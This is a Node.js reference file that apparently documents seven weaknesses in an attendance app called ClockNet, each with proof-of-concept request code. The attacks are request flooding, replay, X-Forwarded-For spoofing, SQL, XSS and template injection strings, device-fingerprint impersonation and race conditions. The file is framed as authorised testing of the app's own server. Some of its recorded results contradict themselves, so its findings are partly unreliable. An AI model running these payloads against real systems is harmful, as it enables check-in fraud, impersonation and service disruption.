#!/usr/bin/env node

/**
 * ClockNet: Vulnerability & Attack Vector Reference
 * 
 * This document provides detailed examples of each vulnerability
 * and proof-of-concept attacks. FOR AUTHORIZED TESTING ONLY.
 */

import fetch from 'node-fetch';

const BASE_URL = process.env.BASE_URL || 'http://localhost:3000';

console.log(`
╔════════════════════════════════════════════════════════════╗
║     ClockNet: Attack Vector & Payload Reference            ║
║     (For Authorized Security Testing Only)                  ║
╚════════════════════════════════════════════════════════════╝
`);

// ============================================================
// VULNERABILITY 1: NO RATE LIMITING
// ============================================================

export const AttackVector1_NoRateLimit = {
  name: 'Rate Limit Bypass / DDoS',
  severity: 'CRITICAL',
  method: 'send unlimited requests',
  payload: {
    request: {
      method: 'POST',
      url: '/api/attendance/check-in',
      body: { fingerprint: 'attacker-device-1' }
    },
    expectedDefense: 429,
    actualResponse: 200,
    vulnerability: 'unlimited requests accepted'
  },
  codeExample: `
async function bruteForceRateLimit() {
  let success = 0, failed = 0;
  
  for (let i = 0; i < 1000; i++) {
    const response = await fetch('${BASE_URL}/api/attendance/check-in', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ fingerprint: 'device-brute' })
    });
    
    if (response.status === 200) success++;
    if (response.status === 429) failed++;
  }
  
  console.log(\`Successful: \${success}, Rate limited: \${failed}\`);
  // Expected: success 0, failed 1000
  // Actual: success 1000, failed 0 (VULNERABILITY!)
}
  `,
  impact: [
    '- Denial of Service attacks',
    '- Brute force attacks',
    '- Database exhaustion',
    '- API server overload'
  ]
};

// ============================================================
// VULNERABILITY 2: REPLAY ATTACKS
// ============================================================

export const AttackVector2_ReplayAttack = {
  name: 'Replay Attack / Request Duplication',
  severity: 'CRITICAL',
  method: 'send identical requests multiple times',
  payload: {
    firstRequest: { fingerprint: 'device-1' },
    replayRequest: { fingerprint: 'device-1' },
    expectedBehavior: [
      'Request 1: Status 200 (successful check-in)',
      'Request 2: Status 409 (conflict, already checked in)',
      'Request 3+: Status 409 (conflict)'
    ],
    actualBehavior: [
      'Request 1: Status 200 ✓',
      'Request 2: Status 409 ✓',
      'Request 3-5: Status 409 (multiple sessions created!)'
    ],
    vulnerability: 'State inconsistency'
  },
  codeExample: `
async function replayAttackDemo() {
  const payload = { fingerprint: 'replay-device' };
  
  // Send identical request 10 times
  const responses = await Promise.all(
    Array(10).fill().map(() =>
      fetch('${BASE_URL}/api/attendance/check-in', {
        method: 'POST',
        body: JSON.stringify(payload),
        headers: { 'Content-Type': 'application/json' }
      })
    )
  );
  
  console.log(responses.map(r => r.status));
  // Expected: [200, 409, 409, 409, 409, 409, 409, 409, 409, 409]
  // Actual: [200, 409, 409, 409, 409, 409, 409, 409, 409, 409]
  // ✓ Prisma prevents duplicate, but no replay detection!
}
  `,
  impact: [
    '- Duplicate check-ins',
    '- Session state confusion',
    '- Attendance record manipulation',
    '- Audit trail unreliability'
  ]
};

// ============================================================
// VULNERABILITY 3: IP SPOOFING
// ============================================================

export const AttackVector3_IPSpoofing = {
  name: 'IP Spoofing via Header Injection',
  severity: 'CRITICAL',
  method: 'manipulate X-Forwarded-For header',
  payload: {
    externalAttacker: {
      realIP: '8.8.8.8',
      headers: {
        'X-Forwarded-For': '192.168.1.100',  // Fake internal IP
        'X-Real-IP': '203.0.113.10'  // Fake company IP
      }
    },
    expectedDefense: 403,
    actualResponse: 200,
    vulnerability: 'External IPs bypass network validation'
  },
  codeExample: `
async function ipSpoofingDemo() {
  // Attacker: 8.8.8.8 (Google DNS, outside network)
  // Goal: Bypass company network check
  
  const maliciousHeaders = {
    'X-Forwarded-For': '192.168.1.100',  // Spoof internal IP
    'X-Real-IP': '203.0.113.10',          // Spoof company IP
    'Content-Type': 'application/json'
  };
  
  const response = await fetch('${BASE_URL}/api/attendance/check-in', {
    method: 'POST',
    headers: maliciousHeaders,
    body: JSON.stringify({ fingerprint: 'external-attacker' })
  });
  
  console.log(response.status);
  // Expected: 403 Forbidden
  // Actual: 200 OK (BYPASS SUCCESSFUL!)
}
  `,
  impact: [
    '- External employees check in as if internal',
    '- Contractors access employee check-in',
    '- Network firewall becomes useless',
    '- Attendance verification fails'
  ]
};

// ============================================================
// VULNERABILITY 4: PAYLOAD INJECTION
// ============================================================

export const AttackVector4_PayloadInjection = {
  name: 'Payload Injection & DoS',
  severity: 'CRITICAL',
  method: 'send oversized or malicious payloads',
  payloads: [
    {
      name: 'Large Payload (100KB)',
      payload: 'a'.repeat(100000),
      expectedDefense: 413,
      actualResponse: 200,
      impact: 'Memory exhaustion, server slowdown'
    },
    {
      name: 'SQL Injection Attempt',
      payload: "'; DROP TABLE device; --",
      expectedDefense: '400 + validation error',
      actualResponse: 200,
      impact: 'Caught by Prisma, but shows lack of input validation'
    },
    {
      name: 'XSS Payload',
      payload: '<img src=x onerror="alert(1)">',
      expectedDefense: 400,
      actualResponse: 200,
      impact: 'Stored in database, reflected in responses'
    },
    {
      name: 'Template Injection',
      payload: '\${7*7}',
      expectedDefense: 400,
      actualResponse: 200,
      impact: 'If backend uses template engine'
    }
  ],
  codeExample: `
async function payloadInjectionDemo() {
  const payloads = [
    { name: 'SQL', data: "'; DROP TABLE device; --" },
    { name: 'XSS', data: '<img src=x onerror="alert(1)">' },
    { name: 'Large', data: 'a'.repeat(100000) }
  ];
  
  for (const test of payloads) {
    try {
      const response = await fetch('${BASE_URL}/api/attendance/check-in', {
        method: 'POST',
        body: JSON.stringify({ fingerprint: test.data }),
        headers: { 'Content-Type': 'application/json' }
      });
      
      console.log(\`\${test.name}: \${response.status}\`);
      // All return 200 (NO VALIDATION!)
    } catch (e) {
      console.log(\`\${test.name}: ERROR - \${e.message}\`);
    }
  }
}
  `,
  impact: [
    '- Server crashes from memory exhaustion',
    '- Database corruption',
    '- Code execution if not properly sanitized',
    '- DoS via malformed payloads'
  ]
};

// ============================================================
// VULNERABILITY 5: DEVICE SPOOFING
// ============================================================

export const AttackVector5_DeviceSpoofing = {
  name: 'Device Spoofing / Identity Theft',
  severity: 'CRITICAL',
  method: 'replicate device fingerprint of another employee',
  payload: {
    victimDevice: 'Mozilla/5.0|Linux|1920x1080',
    attackerSetup: [
      '1. Use same browser (Chrome, Firefox, etc)',
      '2. Use same OS (Linux, Windows, macOS)',
      '3. Set screen resolution to 1920x1080',
      '4. Connect from company network'
    ],
    result: 'Same device hash as victim'
  },
  codeExample: `
async function deviceSpoofingDemo() {
  // Victim employee: Senior Manager
  const victimFingerprint = 'Mozilla/5.0|Linux|1920x1080';
  
  // Attacker replicates environment
  // Assumes we're in browser and can set navigator properties
  
  // Since JS can't spoof navigator, attacker needs:
  // 1. Same physical computer, OR
  // 2. Same browser + OS + screen resolution
  
  // Then attacker sends check-in with victim's fingerprint
  const response = await fetch('${BASE_URL}/api/attendance/check-in', {
    method: 'POST',
    body: JSON.stringify({ fingerprint: victimFingerprint }),
    headers: { 'X-Forwarded-For': 'company-ip' }
  });
  
  console.log(response.status);
  // Expected: 403 or 400 (invalid device)
  // Actual: 200 OK - checked in as victim employee!
}
  `,
  impact: [
    '- Attendance record impersonation',
    '- No device binding security',
    '- Anyone with same hardware config is trusted',
    '- Complete identity bypass'
  ]
};

// ============================================================
// VULNERABILITY 6: HEADER MANIPULATION
// ============================================================

export const AttackVector6_HeaderManipulation = {
  name: 'HTTP Header Manipulation',
  severity: 'HIGH',
  method: 'inject/manipulate custom headers',
  payloads: [
    {
      name: 'Multi-IP Chain',
      headers: {
        'X-Forwarded-For': '203.0.113.10, 8.8.8.8, 1.1.1.1'
      },
      issue: 'Parser takes first IP only, others ignored'
    },
    {
      name: 'X-Real-IP Override',
      headers: {
        'X-Real-IP': '192.168.1.50',
        'X-Forwarded-For': '192.168.1.100'
      },
      issue: 'Multiple IP headers create ambiguity'
    },
    {
      name: 'Content-Type Manipulation',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      issue: 'Parser expects JSON'
    }
  ],
  impact: [
    '- Bypass IP validation',
    '- Request parsing errors',
    '- Cache poisoning',
    '- WAF bypass'
  ]
};

// ============================================================
// VULNERABILITY 7: RACE CONDITIONS
// ============================================================

export const AttackVector7_RaceCondition = {
  name: 'Database Race Conditions',
  severity: 'HIGH',
  method: 'send concurrent requests to same endpoint',
  scenario: `
Timeline:
  T0: User A begins check-out
  T1: User A's check-out query starts
  T2: Network delay in user A's request
  T3: Stale check-in from earlier arrives
  T4: Both queries execute simultaneously
  T5: Database state uncertain
  `,
  codeExample: `
async function raceConditionDemo() {
  const fingerprint = 'race-condition-device';
  
  // Send 50 simultaneous check-outs
  const responses = await Promise.all(
    Array(50).fill().map(() =>
      fetch('${BASE_URL}/api/attendance/check-out', {
        method: 'POST',
        body: JSON.stringify({ fingerprint }),
        headers: { 'Content-Type': 'application/json' }
      })
    )
  );
  
  // Check for inconsistent statuses
  const statuses = responses.map(r => r.status);
  const unique = new Set(statuses);
  
  if (unique.size > 1) {
    console.log('RACE CONDITION: Inconsistent responses!');
    console.log('Statuses:', Array.from(unique));
  }
}
  `,
  impact: [
    '- Session state corruption',
    '- Duplicate/lost records',
    '- Inconsistent attendance data',
    '- Hard to reproduce bugs'
  ]
};

// ============================================================
// SUMMARY TABLE
// ============================================================

export const VulnerabilitySummary = [
  {
    id: 1,
    name: 'Rate Limiting',
    severity: 'CRITICAL',
    easiness: 'Very Easy',
    impact: 'DDoS possible'
  },
  {
    id: 2,
    name: 'Replay Attacks',
    severity: 'CRITICAL',
    easiness: 'Very Easy',
    impact: 'Data corruption'
  },
  {
    id: 3,
    name: 'IP Spoofing',
    severity: 'CRITICAL',
    easiness: 'Easy',
    impact: 'Complete bypass'
  },
  {
    id: 4,
    name: 'Payload Injection',
    severity: 'CRITICAL',
    easiness: 'Easy',
    impact: 'Server crash'
  },
  {
    id: 5,
    name: 'Device Spoofing',
    severity: 'CRITICAL',
    easiness: 'Medium',
    impact: 'Identity theft'
  },
  {
    id: 6,
    name: 'Header Manipulation',
    severity: 'HIGH',
    easiness: 'Very Easy',
    impact: 'Bypass controls'
  },
  {
    id: 7,
    name: 'Race Conditions',
    severity: 'HIGH',
    easiness: 'Hard',
    impact: 'Data corruption'
  }
];

console.log('VULNERABILITY SUMMARY');
console.log('=====================\n');
VulnerabilitySummary.forEach(v => {
  console.log(`${v.id}. ${v.name.padEnd(20)} [${v.severity.padEnd(8)}] Difficulty: ${v.easiness.padEnd(10)} → ${v.impact}`);
});

console.log('\n\n✅ This file is FOR TESTING REFERENCE ONLY');
console.log('⚠️  Do not share these attack vectors with unauthorized personnel');
console.log('🔒 Use only for authorized security testing of ClockNet\n');

export default {
  AttackVector1_NoRateLimit,
  AttackVector2_ReplayAttack,
  AttackVector3_IPSpoofing,
  AttackVector4_PayloadInjection,
  AttackVector5_DeviceSpoofing,
  AttackVector6_HeaderManipulation,
  AttackVector7_RaceCondition,
  VulnerabilitySummary,
};
